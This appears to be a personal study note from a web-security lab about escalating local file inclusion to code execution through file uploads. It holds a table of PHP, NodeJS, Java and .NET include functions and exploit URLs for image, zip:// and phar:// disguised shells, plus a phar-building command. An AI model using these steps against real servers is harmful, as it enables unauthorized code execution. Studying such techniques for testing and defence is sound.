- we need the app to allow us to upload our files.
- if we can upload our shell (maybe disguised as `.jpg`)

| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | ---------------- | ----------- | -------------- |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` | ✅                | ✅           | ✅              |
| `require()`/`require_once()` | ✅                | ✅           | ❌              |
| **NodeJS**                   |                  |             |                |
| `res.render()`               | ✅                | ✅           | ❌              |
| **Java**                     |                  |             |                |
| `import`                     | ✅                | ✅           | ✅              |
| **.NET**                     |                  |             |                |
| `include`                    | ✅                | ✅           | ✅              |
## Image upload
### Create an image payload
- ![](/attachments/Pasted-image-20250706182756.png)
- ![](/attachments/Pasted-image-20250706182829.png)
- Upload this file to the app
- The file in itself cannot harm the application.
- But, if paired with LFI where we can execute a given file, this can cause issues.
### Uploaded File Path
- once the image is uploaded, go to the source code.
- the source code of the image will show the relative URL.
	- ![](/attachments/Pasted-image-20250706183035.png)
- ![](/attachments/Pasted-image-20250706183046.png)
- Now, since we know where our uploaded file is, we can exploit LFI
- `http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id`
- ![](/attachments/Pasted-image-20250706183149.png)

<hr>

## ZIP upload
- create a `shell.php` and zip it into `shell.jpg`
- ![](/attachments/Pasted-image-20250706184126.png)
- ![](/attachments/Pasted-image-20250706184134.png)
- After a successful upload, use the ZIP wrapper to exploit LFI
- ![](/attachments/Pasted-image-20250706184414.png)
	- `http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id`
- ![](/attachments/Pasted-image-20250706184426.png)

<hr>

## Phar Upload
- write the following script to `shell.php`
- ![](/attachments/Pasted-image-20250706184524.png)
- ![](/attachments/Pasted-image-20250706184612.png)
- `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg`
	- this will give us a `shell.jpg` as a phar file
- ![](/attachments/Pasted-image-20250706184704.png)
	- `http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id`
- ![](/attachments/Pasted-image-20250706184737.png)
	- https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo
